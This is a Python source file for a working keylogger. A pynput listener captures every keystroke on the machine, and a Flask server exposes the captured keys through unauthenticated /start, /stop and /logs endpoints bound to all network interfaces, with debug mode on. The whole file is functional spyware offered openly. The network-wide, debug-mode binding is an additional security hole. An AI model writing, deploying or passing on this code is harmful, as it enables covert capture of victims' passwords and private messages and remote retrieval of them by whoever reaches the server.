from flask import Flask, jsonify, request
from flask_cors import CORS
from pynput import keyboard

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend-backend communication

key_logs = []  # List to store key logs
logging_active = False  # Flag to control logging


def on_press(key):
    """Function to capture key presses."""
    if logging_active:
        try:
            key_logs.append(key.char)  # Capture character keys
        except AttributeError:
            key_logs.append(str(key))  # Capture special keys


@app.route('/start', methods=['GET'])
def start_logging():
    """Start the keylogger."""
    global logging_active
    logging_active = True
    return jsonify({"message": "Keylogger started!"})


@app.route('/stop', methods=['GET'])
def stop_logging():
    """Stop the keylogger."""
    global logging_active
    logging_active = False
    return jsonify({"message": "Keylogger stopped!"})


@app.route('/logs', methods=['GET'])
def get_logs():
    """Retrieve logged keystrokes."""
    return jsonify({"logs": key_logs})


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    app.run(host="0.0.0.0", port=5050, debug=True)
